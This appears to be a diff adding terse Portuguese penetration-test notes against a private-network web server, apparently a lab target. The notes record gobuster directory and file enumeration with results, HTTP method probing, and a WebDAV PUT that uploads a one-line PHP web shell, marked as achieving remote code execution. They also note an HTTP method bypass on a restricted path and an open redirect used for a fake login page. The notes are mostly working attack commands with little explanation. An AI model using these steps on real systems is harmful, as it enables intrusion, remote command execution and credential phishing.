@@ -1,0 +1,82 @@
+172.16.1.10
+
+--------------------------------------------------------------------
+
+gobuster dir -e -u http://172.16.1.10/ -w /usr/share/wordlists/dirb/big.txt
+
+DIRETORIOS
+http://172.16.1.10/hosting - OK
+http://172.16.1.10/logs - RESTRITO
+http://172.16.1.10/turismo - OK
+http://172.16.1.10/webdav - LISTAGEM DE DIRETÓRIO
+
+--------------------------------------------------------------------
+
+ALVO 1
+http://172.16.1.10/turismo
+
+--------------------------------------------------------------------
+
+gobuster dir -u http://172.16.1.10/turismo -w /usr/share/wordlists/dirb/big.txt -x .php,.txt,.bkp,.sql
+
+ARQUIVOS
+http://172.16.1.10/turismo/adm.php              (Status: 200)
+http://172.16.1.10/turismo/agencias.php         (Status: 200)
+http://172.16.1.10/turismo/banners              (Status: 301)
+http://172.16.1.10/turismo/bkp.sql              (Status: 200)
+http://172.16.1.10/turismo/css                  (Status: 301)
+http://172.16.1.10/turismo/img                  (Status: 301)
+http://172.16.1.10/turismo/index.php            (Status: 200)
+http://172.16.1.10/turismo/info.php             (Status: 200)
+http://172.16.1.10/turismo/link.php             (Status: 200)
+http://172.16.1.10/turismo/local                (Status: 301)
+http://172.16.1.10/turismo/login.php            (Status: 200)
+http://172.16.1.10/turismo/logaout.php          (Status: 200)
+http://172.16.1.10/turismo/modelo.php           (Status: 200)
+http://172.16.1.10/turismo/pages.php            (Status: 200)
+http://172.16.1.10/turismo/painel.php           (Status: 200)
+http://172.16.1.10/turismo/redir.php            (Status: 200)
+http://172.16.1.10/turismo/registrar.php        (Status: 200)
+http://172.16.1.10/turismo/sobre.php       	(Status: 200)
+
+--------------------------------------------------------------------
+
+curl -v -X OPTIONS http://172.16.1.10/
+
+METODOS ACEITOS
+Server: Apache/2.4.41 (Ubuntu)
+
+/ - Allow: GET,POST,OPTIONS,HEAD
+/logs - Allow: GET,POST,OPTIONS,HEAD
+/webdav - Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK
+
+--------------------------------------------------------------------
+
+EXPLORANDO WEBDAV
+curl -v -X PUT -d "<?php system(\$_GET['cmd']); ?>" http://172.16.1.10/webdav/page.php
+
+cadaver http://172.16.1.10/webdav/
+
+RCE OBTIDO
+
+--------------------------------------------------------------------
+
+EXPLORANDO LOGS
+
+Bypass de metodo
+curl -v -X POST http://172.16.1.10/logs/
+Acesso concedido
+
+--------------------------------------------------------------------
+
+CODIGO FONTE
+
+http://172.16.1.10/turismo/cupom.php
+http://172.16.1.10/turismo/link.php?link=https://turismo.ig.com.br/manual-do-viajante/index
+
+--------------------------------------------------------------------
+
+OPEN REDIRECT
+172.16.1.10/turismo/redir.php?url=
+PÁGINA FALSA DE AUTENTICAÇÃO OK
+
